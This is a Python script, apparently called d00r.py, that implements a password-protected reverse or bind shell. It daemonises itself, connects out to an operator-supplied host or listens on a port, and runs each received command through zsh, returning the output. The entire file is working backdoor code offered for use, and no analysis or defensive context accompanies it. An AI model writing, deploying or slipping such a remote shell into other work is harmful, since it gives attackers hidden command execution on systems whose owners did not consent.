#!/usr/bin/env python3

# d00r.py 0.3a (reverse|bind)-shell in Python by fQ
# alpha

import os
import sys
import socket
import time

# Global variables
MAX_LEN = 1024
SHELL = ["/bin/zsh", "-c"]
TIME_OUT = 300  # seconds
PW = ""
PORT = ""
HOST = ""

# Function to execute shell commands and return output
def shell(cmd):
    sh_out = os.popen(" ".join(SHELL + [cmd])).read()
    return sh_out

# Function to handle shell interaction
def handle_shell(conn):
    conn.send(b"\nPassword?\n")
    try:
        pw_in = conn.recv(len(PW))
    except socket.timeout:
        print("Timeout")
    else:
        if pw_in == PW.encode():
            conn.send(b"You are on air!\n")
            while True:
                conn.send(b">>> ")
                try:
                    pcmd = conn.recv(MAX_LEN).decode().strip()
                except socket.timeout:
                    print("Timeout")
                    return True
                else:
                    if pcmd == ":dc":
                        return True
                    elif pcmd == ":sd":
                        return False
                    else:
                        if len(pcmd) > 0:
                            out = shell(pcmd)
                            conn.send(out.encode())

# Main function
def main():
    global PW, PORT, HOST

    argv = sys.argv

    if len(argv) < 4:
        print("Error; usage: python3 d00r.py -b password port")
        print("       python3 d00r.py -r password port host")
        sys.exit(1)
    elif argv[1] == "-b":
        PW = argv[2]
        PORT = argv[3]
    elif argv[1] == "-r" and len(argv) > 4:
        PW = argv[2]
        PORT = argv[3]
        HOST = argv[4]
    else:
        print("Invalid arguments")
        sys.exit(1)

    PORT = int(PORT)
    print("PW:", PW, "PORT:", PORT, "HOST:", HOST)

    # Daemonize the process
    if os.fork() != 0:
        sys.exit(0)

    # Create and configure socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(TIME_OUT)

    if argv[1] == "-b":
        sock.bind(('localhost', PORT))
        sock.listen(0)

    run = True
    while run:
        if argv[1] == "-r":
            try:
                sock.connect((HOST, PORT))
            except Exception as e:
                print("Host unreachable:", e)
                time.sleep(5)
            else:
                run = handle_shell(sock)
        else:
            try:
                conn, addr = sock.accept()
            except socket.timeout:
                print("Timeout")
                time.sleep(1)
            else:
                run = handle_shell(conn)

        # Shutdown the socket
        if argv[1] == "-b":
            conn.shutdown(socket.SHUT_RDWR)
        else:
            try:
                sock.send(b"")
            except Exception as e:
                time.sleep(1)
            else:
                sock.shutdown(socket.SHUT_RDWR)

if __name__ == "__main__":
    main()
